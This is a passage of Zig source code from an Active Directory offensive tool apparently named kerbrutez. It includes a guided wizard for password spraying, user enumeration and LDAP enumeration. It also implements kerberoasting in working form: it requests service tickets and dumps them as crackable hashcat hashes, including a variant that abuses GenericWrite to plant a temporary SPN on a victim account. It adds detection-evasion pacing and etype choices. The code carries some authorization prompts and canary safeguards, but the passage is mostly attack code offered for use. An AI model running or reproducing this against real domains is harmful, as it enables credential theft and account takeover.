            if (n_pass == 1) n_users += 1;
            const line = std.fmt.allocPrint(allocator, "{s}:{s}", .{ u, pw }) catch return 1;
            combos.append(allocator, line) catch return 1;
        }
    }
    if (combos.items.len == 0) return cmdArgError(io, "spraycampaign: empty users or passwords");

    return runPool(allocator, io, flags, .{ .prebuilt = combos.items }, .bruteforce, false, false, true, "logins", "successes", .{ .users = n_users, .passwords = n_pass });
}

/// Resolve a "list or single" argument: if `arg` names a readable file, return
/// its lines; otherwise return a one-element list of `arg` itself. `backing`
/// receives the file contents (caller frees) when a file was read.
/// OWNERSHIP: caller frees the returned slice.
fn resolveList(allocator: Allocator, io: Io, arg: []const u8, backing: *?[]u8) ![]const []const u8 {
    if (Io.Dir.cwd().openFile(io, arg, .{})) |f_const| {
        var f = f_const;
        defer f.close(io);
        var buf: [64 * 1024]u8 = undefined;
        var r = f.reader(io, &buf);
        const content = try r.interface.allocRemaining(allocator, .unlimited);
        backing.* = content;
        return splitLines(allocator, content);
    } else |_| {
        const one = try allocator.alloc([]const u8, 1);
        one[0] = arg; // a single literal value (borrows the CLI arg)
        return one;
    }
}

// ===========================================================================
// Wizard (M11) — interactive guided mode
// ===========================================================================

/// Small stdin Q&A helper. Answers are duped into an arena so they survive past
/// the shared stdin line buffer.
const Wiz = struct {
    io: Io,
    arena: Allocator,
    /// The Reader interface (not a File.Reader) so tests can drive the wizard
    /// from a fixed buffer instead of a real stdin.
    r: *Io.Reader,
    /// Set once stdin can no longer supply answers — EOF (closed/redirected
    /// stdin, a script that ran out of input, a dropped SSH session) or a line
    /// too long for the read buffer. Prompting again cannot help, so every
    /// re-prompting loop has to check this or it spins forever.
    input_ended: bool = false,
    /// Whether the "stdin closed" notice has already been shown.
    announced_eof: bool = false,
    /// Suppress prompt output. Set by the input-layer tests, which must not
    /// write to stdout — under `zig build test` that stream carries the test
    /// runner's protocol (see the same note in workers.zig).
    quiet: bool = false,

    fn say(self: *Wiz, comptime fmt: []const u8, args: anytype) void {
        if (self.quiet) return;
        printOut(self.io, fmt, args);
    }

    fn readLine(self: *Wiz) ?[]const u8 {
        const line = self.r.takeDelimiter('\n') catch {
            self.input_ended = true; // e.g. a line longer than the read buffer
            return null;
        };
        const l = line orelse {
            self.input_ended = true; // EOF
            return null;
        };
        return std.mem.trim(u8, l, " \t\r\n");
    }

    /// Prompt and return the (arena-owned) trimmed answer ("" on EOF).
    fn ask(self: *Wiz, q: []const u8) []const u8 {
        self.say("{s}", .{q});
        const t = self.readLine() orelse return "";
        return self.arena.dupe(u8, t) catch "";
    }

    /// Like `ask`, but returns null when the answer is blank.
    fn askOpt(self: *Wiz, q: []const u8) ?[]const u8 {
        const v = self.ask(q);
        return if (v.len == 0) null else v;
    }

    /// Required free-text answer (re-prompts until non-empty).
    ///
    /// MUST give up once stdin is exhausted. `ask` returns "" for BOTH a blank
    /// line and EOF, so this loop used to spin forever on a closed stdin —
    /// measured at ~4 million "(required)" lines in 5 seconds, pinning a core
    /// and filling the disk if stdout was redirected. Trivially reachable:
    /// `kerbrutez wizard < /dev/null`, any scripted run whose input runs short,
    /// or an SSH session dropping mid-wizard.
    fn askReq(self: *Wiz, q: []const u8) []const u8 {
        while (true) {
            const v = self.ask(q);
            if (v.len > 0) return v;
            if (self.input_ended) {
                // Announce once; the remaining prompts will each hit this too.
                if (!self.announced_eof) {
                    self.announced_eof = true;
                    self.say("\n[!] stdin closed before a required answer was given — aborting the wizard.\n", .{});
                }
                return "";
            }
            self.say("  (required)\n", .{});
        }
    }

    fn askYesNo(self: *Wiz, q: []const u8, default_yes: bool) bool {
        self.say("{s}{s}", .{ q, if (default_yes) " [Y/n]: " else " [y/N]: " });
        const t = self.readLine() orelse return default_yes;
        if (t.len == 0) return default_yes;
        return t[0] == 'y' or t[0] == 'Y';
    }

    /// Numbered menu; returns the 0-based index (default 0 on blank/EOF/bad).
    fn askChoice(self: *Wiz, title: []const u8, options: []const []const u8) usize {
        self.say("{s}:\n", .{title});
        for (options, 0..) |o, i| self.say("  {d}) {s}\n", .{ i + 1, o });
        self.say("  choice [1]: ", .{});
        const t = self.readLine() orelse return 0;
        if (t.len == 0) return 0;
        const n = std.fmt.parseInt(usize, t, 10) catch return 0;
        return if (n >= 1 and n <= options.len) n - 1 else 0;
    }

    fn askEtype(self: *Wiz, flags: *Flags) void {
        flags.etype = switch (self.askChoice("Encryption type", &.{
            "all  - full list (default, noisiest)",
            "aes  - stealthier/modern, slower to crack",
            "rc4  - deprecated, fast to crack (may be rejected)",
        })) {
            1 => .aes,
            2 => .rc4,
            else => .all,
        };
    }

    fn askNoise(self: *Wiz, flags: *Flags) void {
        flags.noise = switch (self.askChoice("Noise level (OPSEC)", &.{
            "3 - loud (default; assumes an authorized engagement)",
            "2 - moderate (light jitter + rate cap)",
            "1 - stealthy (heavy jitter, slow, business-hours)",
        })) {
            1 => .moderate,
            2 => .stealthy,
            else => .loud,
        };
    }
};

/// Discover the AD domain from a DC (DNS-only): if the DC is an FQDN, the domain
/// is the part after the first label; if it's an IPv4 literal, reverse-DNS (PTR)
/// it to an FQDN and take the part after the first label. Returns null on
/// failure. OWNERSHIP: the result is `arena`-owned.
fn discoverDomain(arena: Allocator, io: Io, dc: []const u8, dns_server: ?[]const u8) ?[]const u8 {
    const host = splitHostPort(dc, 88).host; // strip any :port
    if (!isIpv4Literal(host)) {
        // A hostname: domain = everything after the first label.
        const dot = std.mem.indexOfScalar(u8, host, '.') orelse return null;
        return arena.dupe(u8, host[dot + 1 ..]) catch null;
    }
    // An IP: reverse-DNS to an FQDN, then strip the first label.
    const fqdn = krb5.dns.reverseLookup(arena, io, host, dns_server) orelse return null;
    const trimmed = std.mem.trimEnd(u8, fqdn, ".");
    const dot = std.mem.indexOfScalar(u8, trimmed, '.') orelse return null;
    return arena.dupe(u8, trimmed[dot + 1 ..]) catch null;
}

/// True if `s` is a dotted-quad IPv4 literal (4 numeric labels).
fn isIpv4Literal(s: []const u8) bool {
    var it = std.mem.splitScalar(u8, s, '.');
    var n: usize = 0;
    while (it.next()) |p| {
        if (p.len == 0 or p.len > 3) return false;
        for (p) |c| if (c < '0' or c > '9') return false;
        n += 1;
    }
    return n == 4;
}

/// Interactive guided mode. Collects answers, shows the resolved command, asks
/// to confirm, then dispatches to the matching subcommand.
fn runWizard(allocator: Allocator, io: Io, base_flags: Flags) u8 {
    var arena_state = std.heap.ArenaAllocator.init(allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();

    var rbuf: [4096]u8 = undefined;
    var sr = Io.File.stdin().reader(io, &rbuf);
    var w = Wiz{ .io = io, .arena = arena, .r = &sr.interface };

    var flags = base_flags; // inherit --help-parsed flags incl home_dir

    w.say("\n=== kerbrutez wizard ===\nAnswer the prompts (blank = default). I'll show the command before running it.\n\n", .{});

    // --- target ---
    // Domain may be left blank to auto-discover it from the DC (DNS: derive from
    // the DC's FQDN, else reverse-DNS PTR the DC's IP).
    const dom_in = w.askOpt("Target domain (e.g. corp.local; blank = Attempt auto-discover from the DC): ");
    const dc_in = if (dom_in == null)
        w.askReq("Domain Controller IP or FQDN (required to auto-discover the domain): ")
    else
        w.askOpt("Domain Controller IP/host (blank = Attempt DNS SRV discovery): ");
    if (dc_in) |dc| flags.dc = dc;
    // A DNS-server override is relevant when we do DNS lookups (PTR discovery or SRV).
    if (dom_in == null or dc_in == null) {
        flags.dns_server = w.askOpt("DNS server for lookups (blank = system resolver): ");
    }
    flags.domain = dom_in orelse blk: {
        const dc = dc_in.?; // required when the domain was left blank
        if (discoverDomain(w.arena, w.io, dc, flags.dns_server)) |d| {
            w.say("  -> discovered domain: {s}\n", .{d});
            break :blk d;
        }
        w.say("  -> could not auto-discover the domain from '{s}'.\n", .{dc});
        break :blk w.askReq("Target domain: ");
    };
    w.askNoise(&flags);

    // --- operation ---
    const op = w.askChoice("Operation", &.{
        "userenum   - find valid usernames (Kerberos pre-auth)",
        "spray      - password(s) against user(s), lockout-paced campaign",
        "kerberoast - request/crack service tickets",
        "ldapenum   - enumerate via LDAP or a BloodHound dump",
    });

    // If stdin died while gathering answers, stop here. The confirm prompt is
    // askYesNo("Run this now?", default=true), which returns the DEFAULT on EOF
    // — so without this guard a wizard whose input ran out would answer "yes"
    // to itself and launch a half-configured run against a live domain.
    if (w.input_ended) {
        w.say("[!] stdin closed before the wizard finished — nothing was run.\n", .{});
        return 2;
    }
    return switch (op) {
        0 => wizUserenum(allocator, io, &w, &flags),
        1 => wizSpray(allocator, io, &w, &flags),
        2 => wizKerberoast(allocator, io, &w, &flags),
        3 => wizLdapenum(allocator, io, &w, &flags),
        else => 1,
    };
}

/// Print the resolved settings and ask to run. Returns true to proceed.
fn wizConfirm(w: *Wiz, cmd: []const u8, flags: *const Flags, extra: []const u8, args: []const []const u8) bool {
    w.say("\n--- resolved command ---\n  kerbrutez {s} -d {s}", .{ cmd, flags.domain orelse "?" });
    if (flags.dc) |dc| w.say(" --dc {s}", .{dc});
    if (flags.dns_server) |d| w.say(" --dns {s}", .{d});
    if (flags.noise != .loud) w.say(" --noise {d}", .{@intFromEnum(flags.noise)});
    if (flags.etype != .all) w.say(" --etype {s}", .{@tagName(flags.etype)});
    if (flags.ldap_user) |u| w.say(" --ldap-user {s}", .{u});
    if (flags.ldap_pass != null) w.say(" --ldap-pass ****", .{});
    if (flags.userspn) |s| w.say(" --userspn {s}", .{s});
    if (flags.nopreauth_user) |u| w.say(" --nopreauth-user {s}", .{u});
    if (flags.target_user) |u| w.say(" --target-user {s}", .{u});
    if (flags.bloodhound) |b| w.say(" --bloodhound {s}", .{b});
    if (flags.policy_fetch) w.say(" --policy-fetch", .{});
    if (flags.asrep) w.say(" --asrep", .{});
    if (flags.etype_probe) w.say(" --etype-probe", .{});
    if (flags.exclude_disabled) w.say(" --exclude-disabled", .{});
    if (flags.webhook) |x| w.say(" --webhook {s}", .{x});
    if (flags.output) |o| w.say(" -o {s}", .{o});
    if (extra.len > 0) w.say(" {s}", .{extra});
    for (args) |a| w.say(" {s}", .{a});
    w.say("\n------------------------\n", .{});
    // Never let a closed stdin default this to "yes" (see runWizard's guard).
    if (w.input_ended) {
        w.say("[!] stdin closed — not running.\n", .{});
        return false;
    }
    return w.askYesNo("Run this now?", true);
}

fn wizUserenum(allocator: Allocator, io: Io, w: *Wiz, flags: *Flags) u8 {
    const wl = w.askReq("Username wordlist file: ");
    flags.asrep = w.askYesNo("Attempt to dump AS-REP hashes for no-pre-auth accounts (--asrep)?", false);
    flags.etype_probe = w.askYesNo("Probe accepted etypes per user instead of enumerating (--etype-probe)?", false);
    w.askEtype(flags);
    if (w.askOpt("Output base name for reports (-o, blank = none): ")) |o| flags.output = o;
    if (!wizConfirm(w, "userenum", flags, "", &.{wl})) return 0;
    return runUserenum(allocator, io, flags.*, &.{wl});
}

fn wizSpray(allocator: Allocator, io: Io, w: *Wiz, flags: *Flags) u8 {
    const users = w.askReq("Usernames — a wordlist file, OR a single username: ");
    const uap = w.askYesNo("Use each account's own username as the password (--user-as-pass)?", false);
    // Lockout safety.
    if (w.askYesNo("Attempt to read the real lockout policy from AD over LDAP (--policy-fetch)?", false)) {
        flags.policy_fetch = true;
        flags.ldap_user = w.askOpt("  LDAP bind user (blank = anonymous): ");
        if (flags.ldap_user != null) flags.ldap_pass = w.askOpt("  LDAP bind password: ");
    }
    w.askEtype(flags);
    if (w.askOpt("Output base name for reports (-o, blank = none): ")) |o| flags.output = o;

    if (uap) {
        // user-as-pass is its own one-shot spray (not a user×password matrix).
        flags.user_as_pass = true;
        const args = [_][]const u8{users};
        if (!wizConfirm(w, "passwordspray", flags, "--user-as-pass", &args)) return 0;
        return runPasswordspray(allocator, io, flags.*, &args, false);
    }
    const passwords = w.askReq("Passwords — a wordlist file, OR a single password: ");
    const args = [_][]const u8{ users, passwords };
    if (!wizConfirm(w, "spraycampaign", flags, "", &args)) return 0;
    return runSprayCampaign(allocator, io, flags.*, &args);
}

fn wizKerberoast(allocator: Allocator, io: Io, w: *Wiz, flags: *Flags) u8 {
    const scope = w.askChoice("Kerberoast scope", &.{
        "broad     - enumerate every SPN account over LDAP (needs a credential)",
        "single    - one --userspn target (needs a credential)",
        "credless  - via a no-pre-auth account, NO credentials (C2)",
        "dacl-abuse- write a temp SPN onto a GenericWrite victim, roast, restore (C3)",
    });
    switch (scope) {
        0, 1 => { // broad / single — needs creds for the TGT (+ LDAP)
            flags.ldap_user = w.askReq("Domain credential — username: ");
            flags.ldap_pass = w.askOpt("Domain credential — password: ");
            if (scope == 1) flags.userspn = w.askReq("Target SPN (e.g. MSSQLSvc/db.corp.local:1433): ");
        },
        2 => { // C2 credential-less
            flags.nopreauth_user = w.askReq("No-pre-auth requester account (DONT_REQUIRE_PREAUTH): ");
            flags.userspn = w.askReq("Target SPN to roast: ");
            if (w.askYesNo("Resolve the victim's real name over LDAP for a crackable AES hash?", false)) {
                flags.ldap_user = w.askOpt("  LDAP bind user: ");
                if (flags.ldap_user != null) flags.ldap_pass = w.askOpt("  LDAP bind password: ");
            }
        },
        3 => { // C3 DACL abuse
            w.say("\n[!] DACL abuse will WRITE a temporary SPN onto the victim and then REMOVE it (restore).\n", .{});
            if (!w.askYesNo("You are authorized to modify the victim object — continue?", false)) return 0;
            flags.ldap_user = w.askReq("Abuser credential (holds GenericWrite) — username: ");
            flags.ldap_pass = w.askOpt("Abuser credential — password: ");
            flags.target_user = w.askReq("Victim sAMAccountName: ");
        },
        else => {},
    }
    w.askEtype(flags);
    if (w.askOpt("Output base name for reports (-o, blank = none): ")) |o| flags.output = o;
    flags.webhook = w.askOpt("Webhook URL to notify on findings (http://..., blank = none): ");
    if (!wizConfirm(w, "kerberoast", flags, "", &.{})) return 0;
    return runKerberoast(allocator, io, flags.*);
}

fn wizLdapenum(allocator: Allocator, io: Io, w: *Wiz, flags: *Flags) u8 {
    if (w.askYesNo("Offline mode — read a BloodHound/SharpHound dump instead of live LDAP?", false)) {
        flags.bloodhound = w.askReq("Path to the users.json / directory / .zip: ");
    } else {
        flags.ldap_user = w.askOpt("LDAP bind user (blank = anonymous): ");
        if (flags.ldap_user != null) flags.ldap_pass = w.askOpt("LDAP bind password: ");
    }
    flags.exclude_disabled = w.askYesNo("Drop disabled accounts from the output?", false);
    if (w.askOpt("Write the bare working username list to a file (-o, blank = none): ")) |o| flags.output = o;
    if (!wizConfirm(w, "ldapenum", flags, "", &.{})) return 0;
    return runLdapenum(allocator, io, flags.*);
}

/// Kerberoast (C1 standard): obtain a TGT with a domain credential, then request
/// a service ticket for each SPN and dump its enc-part as a `$krb5tgs$` hash.
/// Targets come from `--userspn <SPN>` (one) or LDAP enumeration of accounts that
/// have a servicePrincipalName.
fn runKerberoast(allocator: Allocator, io: Io, flags: Flags) u8 {
    const domain = flags.domain orelse {
        printErr(io, "domain must not be empty (use -d/--domain)\n", .{});
        return 1;
    };
    var logger = Logger.init(io, flags.verbose, flags.output) catch return 1;
    defer logger.deinit();

    // C2: credential-less roast via a DONT_REQUIRE_PREAUTH account (no TGT).
    if (flags.nopreauth_user) |npu| return runKerberoastC2(allocator, io, flags, domain, &logger, npu);
    // C3: DACL-abuse targeted roast — write a temp SPN onto a GenericWrite victim.
    if (flags.target_user) |victim| return runKerberoastC3(allocator, io, flags, domain, &logger, victim);

    const luser = flags.ldap_user orelse {
        logger.err("kerberoast needs a domain credential to obtain a TGT: --ldap-user <user> --ldap-pass <pass>", .{});
        return 1;
    };
    const lpass = flags.ldap_pass orelse "";

    var session = buildSession(allocator, io, &logger, flags, false) orelse return 1;
    defer session.deinit();

    // Kerberos client identity = the local part of the bind user.
    const kuser = if (std.mem.indexOfScalar(u8, luser, '@')) |at| luser[0..at] else luser;

    var client = krb5.client.Client.init(allocator, io, &session.config);
    logger.info("Requesting TGT for {s}@{s} ...", .{ kuser, session.config.realm });
    var tgt = switch (client.getTGT(kuser, lpass)) {
        .ok => |t| t,
        .krb_error => |code| {
            logger.err("TGT request failed: {s}", .{krb5.iana.error_code.name(code)});
            return 1;
        },
        .network_error => {
            logger.err("TGT request: network error reaching the KDC", .{});
            return 1;
        },
        .decrypt_error => {
            logger.err("TGT request: bad password (couldn't decrypt the AS-REP)", .{});
            return 1;
        },
    };
    defer tgt.deinit();
    logger.info("Got TGT for {s} (session etype {d}).", .{ kuser, tgt.session_etype });

    // Optional hash output file (append).
    var hash_file: ?Io.File = null;
    var hash_writer: ?Io.File.Writer = null;
    var hash_buf: [8192]u8 = undefined;
    var hash_pos: u64 = 0;
    if (flags.hash_file) |path| {
        // Crackable TGS/AS-REP hashes.
        hash_file = secret_file.create(io, path, .{ .truncate = false }) catch null;
        if (hash_file) |f| {
            hash_writer = f.writer(io, &hash_buf);
            hash_pos = if (f.stat(io)) |st| st.size else |_| 0;
            logger.info("Saving TGS hashes to {s}", .{path});
        }
    }
    defer if (hash_file) |f| f.close(io);

    var report = report_mod.Report.init(allocator, "kerberoast", domain, session.config.realm, session.config.kdc orelse "dns-srv");
    defer report.deinit();

    // OPSEC applies here too. Kerberoasting bypassed both controls entirely:
    // --canary did not stop us roasting a HONEYPOT SPN (a standard blue-team
    // trap — roasting one is a guaranteed alert), and --noise did not pace the
    // TGS-REQs, so a "stealthy" run still emitted them back-to-back. A burst of
    // 4769s is the classic kerberoast detection signature.
    var roast_canary: ?opsec.CanarySet = null;
    defer if (roast_canary) |*c| c.deinit();
    if (flags.canary_file) |path| {
        if (opsec.CanarySet.loadFromFile(allocator, io, path)) |cs| {
            roast_canary = cs;
            logger.info("[opsec] canary list loaded: {d} protected account(s) will never be roasted", .{cs.count()});
        } else |_| {
            logger.warning("[opsec] couldn't read canary file {s} — proceeding WITHOUT canary protection", .{path});
        }
    }
    const roast_prof = opsec.Profile.fromNoise(flags.noise);
    var roast_gov = opsec.Governor.init(
        @bitCast(Io.Timestamp.now(io, .real).toMicroseconds()),
        flags.jitter_ms orelse roast_prof.jitter_ms,
        flags.rpm orelse roast_prof.rpm,
    );
    if (!roast_gov.isNoop()) {
        logger.info("[opsec] pacing TGS requests: jitter <= {d}ms, {d} req/min", .{ roast_gov.jitter_ms, flags.rpm orelse roast_prof.rpm });
    }

    var roasted: u32 = 0;
    var failed: u32 = 0;

    if (flags.userspn) |spn| {
        // Resolve the account's real sAMAccountName via LDAP — required for a
        // correct AES salt (realm+sAMAccountName). Falls back to a host label.
        const sam_owned = resolveSamForSpn(allocator, io, flags, domain, &logger, spn);
        defer if (sam_owned) |s| allocator.free(s);
        const label = sam_owned orelse deriveSpnLabel(spn);
        if (sam_owned == null) {
            logger.warning("Couldn't resolve sAMAccountName for the SPN over LDAP; using label '{s}' (RC4 cracks fine, but AES cracking needs the real account name)", .{label});
        }
        // Single SPN (not a loop): skip the roast entirely if it is protected.
        if (!canaryBlocks(roast_canary, label, &logger)) {
            paceRequest(io, &roast_gov, flags.delay_ms);
            if (roastOne(allocator, &client, tgt, &logger, label, spn, &hash_writer, &hash_pos, &report)) roasted += 1 else failed += 1;
        }
    } else {
        // Bulk: LDAP-enumerate accounts with an SPN, roast each account's first.
        var lc: ldap.Client = undefined;
        if (!ldapConnectBind(allocator, io, flags, domain, &logger, &lc)) {
            logger.err("kerberoast bulk mode needs LDAP to find SPNs — pass --userspn <SPN> instead, or fix --ldap-*", .{});
            return 1;
        }
        defer lc.deinit();

        const base = ldap.baseDnFromDomain(allocator, domain) catch return 1;
        defer allocator.free(base);
        const f_user = ldap.filterEquality(allocator, "sAMAccountType", "805306368") catch return 1;
        defer allocator.free(f_user);
        const f_spn = ldap.filterPresent(allocator, "servicePrincipalName") catch return 1;
        defer allocator.free(f_spn);
        const filter = ldap.filterAnd(allocator, &.{ f_user, f_spn }) catch return 1;
        defer allocator.free(filter);
        const attrs = [_][]const u8{ "sAMAccountName", "servicePrincipalName" };

        var res = lc.search(base, .whole_subtree, filter, &attrs) catch {
            logger.err("LDAP search for SPN accounts failed", .{});
            return 1;
        };
        defer res.deinit();

        logger.info("Found {d} account(s) with an SPN; roasting...", .{res.entries.len});
        for (res.entries) |e| {
            const sam = e.first("sAMAccountName") orelse continue;
            const spns = e.all("servicePrincipalName");
            if (spns.len == 0) continue;
            if (canaryBlocks(roast_canary, sam, &logger)) continue;
            paceRequest(io, &roast_gov, flags.delay_ms);
            if (roastOne(allocator, &client, tgt, &logger, sam, spns[0], &hash_writer, &hash_pos, &report)) roasted += 1 else failed += 1;
        }
    }

    if (hash_writer) |*w| w.interface.flush() catch {};
    logger.info("Done! Kerberoasted {d} account(s) ({d} failed)", .{ roasted, failed });
    finalizeReport(allocator, io, &logger, flags, &report);
    return if (roasted > 0 or failed == 0) 0 else 1;
}

/// Kerberoast C3 (DACL abuse): the bind user holds GenericWrite over `victim`.
/// We write a temporary servicePrincipalName onto the victim, roast it with our
/// own TGT, then REMOVE the SPN to restore the object. The captured hash is the
/// victim's key — crackable offline.
/// Refuse to touch a single named account when it is on the canary list.
///
/// The one-shot kerberoast variants take an account straight from the operator
/// (--nopreauth-user, --target-user) and act on it outside the worker pool, so
/// they bypassed --canary entirely. C3 is the sharp case: it WRITES an SPN onto
/// the target before roasting it, so a honeypot would be both modified and
/// alerted on.
fn canaryRefusesTarget(allocator: Allocator, io: Io, flags: Flags, account: []const u8, logger: *Logger) bool {
    const path = flags.canary_file orelse return false;
    var cs = opsec.CanarySet.loadFromFile(allocator, io, path) catch {
        logger.warning("[opsec] couldn't read canary file {s} — proceeding WITHOUT canary protection", .{path});
        return false;
    };
    defer cs.deinit();
    if (!cs.contains(account)) return false;
    logger.err("[!] {s} is on the canary list — refusing to touch it.", .{account});
    return true;
}

/// Journal of AD modifications kerbrutez has made but not yet undone.
///
/// C3 WRITES a temporary SPN onto a victim object in the CLIENT'S directory and
/// removes it afterwards. Every failure path falls through to that restore — but
/// a Ctrl-C or a crash in the window between them does not, and the process has
/// no signal handler. What is left behind is an attacker-created SPN on a
/// production account: it makes that account kerberoastable by anyone until
/// someone removes it, and it looks exactly like a real attack to whoever finds
/// it. Recording the intent BEFORE the change means an interrupted run is
/// recoverable instead of silently permanent.
const pending_spn_file = "kerbrutez-pending-spn.txt";

fn notePendingSpn(io: Io, victim_dn: []const u8, spn: []const u8, logger: *Logger) void {
    const f = secret_file.create(io, pending_spn_file, .{ .truncate = false }) catch {
        logger.warning("C3: couldn't record the pending SPN change; if this run is interrupted, remove it manually: setspn -D {s} <victim>", .{spn});
        return;
    };
    defer f.close(io);
    const end: u64 = if (f.stat(io)) |st| st.size else |_| 0;
    var buf: [1024]u8 = undefined;
    var w = f.writer(io, &buf);
    w.pos = end;
    w.interface.print("{s}\t{s}\n", .{ spn, victim_dn }) catch {};
    w.interface.flush() catch {};
}

/// Drop one SPN from the pending journal after it has been successfully removed.
fn clearPendingSpn(allocator: Allocator, io: Io, spn: []const u8) void {
    var file = Io.Dir.cwd().openFile(io, pending_spn_file, .{}) catch return;
    var rbuf: [4096]u8 = undefined;
    var reader = file.reader(io, &rbuf);
    const content = reader.interface.allocRemaining(allocator, .unlimited) catch {
        file.close(io);
        return;
    };
    defer allocator.free(content);
    file.close(io);

    var kept: std.ArrayList(u8) = .empty;
    defer kept.deinit(allocator);
    var it = std.mem.tokenizeScalar(u8, content, '\n');
    while (it.next()) |line| {
        if (std.mem.startsWith(u8, line, spn) and line.len > spn.len and line[spn.len] == '\t') continue;
        kept.appendSlice(allocator, line) catch return;
        kept.append(allocator, '\n') catch return;
    }
    if (kept.items.len == 0) {
        Io.Dir.cwd().deleteFile(io, pending_spn_file) catch {};
        return;
    }
    const f = secret_file.create(io, pending_spn_file, .{ .truncate = true }) catch return;
    defer f.close(io);
    var wbuf: [4096]u8 = undefined;
    var w = f.writerStreaming(io, &wbuf);
    w.interface.writeAll(kept.items) catch {};
    w.interface.flush() catch {};
}

/// Warn about SPNs a previous interrupted run left behind in the client's AD.
fn warnPendingSpns(allocator: Allocator, io: Io, logger: *Logger) void {
    var file = Io.Dir.cwd().openFile(io, pending_spn_file, .{}) catch return;
    defer file.close(io);
    var rbuf: [4096]u8 = undefined;
    var reader = file.reader(io, &rbuf);
    const content = reader.interface.allocRemaining(allocator, .unlimited) catch return;
    defer allocator.free(content);
    var it = std.mem.tokenizeScalar(u8, content, '\n');
    while (it.next()) |line| {
        const tab = std.mem.indexOfScalar(u8, line, '\t') orelse continue;
        logger.err("[!] A previous run left a temp SPN on the CLIENT'S directory and did not remove it: '{s}' on {s}. Remove it: setspn -D {s} <account>", .{ line[0..tab], line[tab + 1 ..], line[0..tab] });
    }
}

fn runKerberoastC3(allocator: Allocator, io: Io, flags: Flags, domain: []const u8, logger: *Logger, victim: []const u8) u8 {
    warnPendingSpns(allocator, io, logger);
    if (canaryRefusesTarget(allocator, io, flags, victim, logger)) return 2;
    const luser = flags.ldap_user orelse {
        logger.err("C3 (--target-user) needs the GenericWrite holder's credential: --ldap-user <abuser> --ldap-pass <pw>", .{});
        return 1;
    };
    const lpass = flags.ldap_pass orelse "";

    var session = buildSession(allocator, io, logger, flags, false) orelse return 1;
    defer session.deinit();

    // Bind LDAP as the abuser (the account that holds GenericWrite over victim).
    var lc: ldap.Client = undefined;
    if (!ldapConnectBind(allocator, io, flags, domain, logger, &lc)) {
        logger.err("C3: LDAP bind failed — need the abuser's --ldap-user/--ldap-pass", .{});
        return 1;
    }
    defer lc.deinit();

    // Locate the victim object (its DN is the write target).
    const base = ldap.baseDnFromDomain(allocator, domain) catch return 1;
    defer allocator.free(base);
    const filt = ldap.filterEquality(allocator, "sAMAccountName", victim) catch return 1;
    defer allocator.free(filt);
    const attrs = [_][]const u8{ "sAMAccountName", "servicePrincipalName" };
    var res = lc.search(base, .whole_subtree, filt, &attrs) catch {
        logger.err("C3: LDAP search for victim '{s}' failed", .{victim});
        return 1;
    };
    defer res.deinit();
    if (res.entries.len == 0) {
        logger.err("C3: victim '{s}' not found in the directory", .{victim});
        return 1;
    }
    const victim_dn = res.entries[0].dn;
    const pre_existing = res.entries[0].all("servicePrincipalName").len;

    // A unique temp SPN (timestamp suffix) so it can't collide and is easy to
    // remove cleanly afterwards.
    const now = Io.Timestamp.now(io, .real).toSeconds();
    const temp_spn = std.fmt.allocPrint(allocator, "kerbrutez/roast-{s}-{d}", .{ victim, now }) catch return 1;
    defer allocator.free(temp_spn);

    logger.info("C3: victim {s} (DN {s}); had {d} SPN(s) before", .{ victim, victim_dn, pre_existing });
    logger.info("C3: abusing GenericWrite — adding temp SPN '{s}'", .{temp_spn});
    logger.warning("[!] This MODIFIES the client's directory. Do not interrupt: a Ctrl-C before the restore leaves '{s}' on {s}. If that happens, remove it with: setspn -D {s} {s}", .{ temp_spn, victim, temp_spn, victim });
    notePendingSpn(io, victim_dn, temp_spn, logger);
    const add_rc = lc.modify(victim_dn, .add, "servicePrincipalName", &.{temp_spn}) catch {
        logger.err("C3: SPN write failed (network/protocol)", .{});
        return 1;
    };
    if (add_rc != 0) {
        logger.err("C3: SPN write REJECTED (LDAP resultCode {d}) — does '{s}' actually hold GenericWrite over '{s}'?", .{ add_rc, luser, victim });
        return 1;
    }

    // Everything from here MUST restore the SPN before returning.
    var rc: u8 = 1;
    var report = report_mod.Report.init(allocator, "kerberoast-c3", domain, session.config.realm, session.config.kdc orelse "dns-srv");
    defer report.deinit();

    const kuser = if (std.mem.indexOfScalar(u8, luser, '@')) |at| luser[0..at] else luser;
    var client = krb5.client.Client.init(allocator, io, &session.config);
    switch (client.getTGT(kuser, lpass)) {
        .ok => |tgt_const| {
            var tgt = tgt_const;
            defer tgt.deinit();
            switch (client.kerberoast(tgt, temp_spn)) {
                .ok => |rt_const| {
                    var rt = rt_const;
                    defer rt.deinit();
                    if (hashutil.tgsToHashcat(allocator, rt.etype, victim, rt.crealm, temp_spn, rt.cipher)) |hash| {
                        defer allocator.free(hash);
                        report.addTgsRoast(victim, hash, temp_spn, hashutil.tgsHashcatMode(rt.etype));
                        if (hashutil.tgsHashcatMode(rt.etype)) |mode| {
                            logger.notice("[+] {s} — targeted TGS hash via GenericWrite (hashcat -m {d}):\n{s}", .{ victim, mode, hash });
                        } else {
                            logger.notice("[+] {s} — targeted TGS hash (etype {d}):\n{s}", .{ victim, rt.etype, hash });
                        }
                        rc = 0;
                    } else |_| logger.err("C3: couldn't format TGS hash", .{});
                },
                .krb_error => |code| logger.err("C3: TGS request failed: {s}", .{krb5.iana.error_code.name(code)}),
                .network_error => logger.err("C3: network error during the TGS request", .{}),
                .parse_error => logger.err("C3: couldn't parse the TGS-REP", .{}),
            }
        },
        .krb_error => |code| logger.err("C3: couldn't get a TGT as '{s}': {s}", .{ kuser, krb5.iana.error_code.name(code) }),
        .network_error => logger.err("C3: network error obtaining a TGT", .{}),
        .decrypt_error => logger.err("C3: bad password for '{s}' (couldn't decrypt AS-REP)", .{kuser}),
    }

    // RESTORE: remove the temp SPN we added, returning the object to its prior state.
    const del_rc = lc.modify(victim_dn, .delete, "servicePrincipalName", &.{temp_spn}) catch -1;
    if (del_rc == 0) {
        clearPendingSpn(allocator, io, temp_spn);
        logger.info("C3: restored — removed temp SPN '{s}' from {s}", .{ temp_spn, victim });
    } else {
        logger.warning("C3: [!] FAILED to remove temp SPN '{s}' (rc {d}) — REMOVE IT MANUALLY: setspn -D {s} {s}", .{ temp_spn, del_rc, temp_spn, victim });
    }

    finalizeReport(allocator, io, logger, flags, &report);
    return rc;
}

/// Kerberoast C2: roast `spn` using a no-preauth account `npu` with NO
/// credentials (AS-REQ-with-sname). The label uses the real sAMAccountName when
/// LDAP creds are supplied (correct AES salt), else a host-derived label.
fn runKerberoastC2(allocator: Allocator, io: Io, flags: Flags, domain: []const u8, logger: *Logger, npu: []const u8) u8 {
    if (canaryRefusesTarget(allocator, io, flags, npu, logger)) return 2;
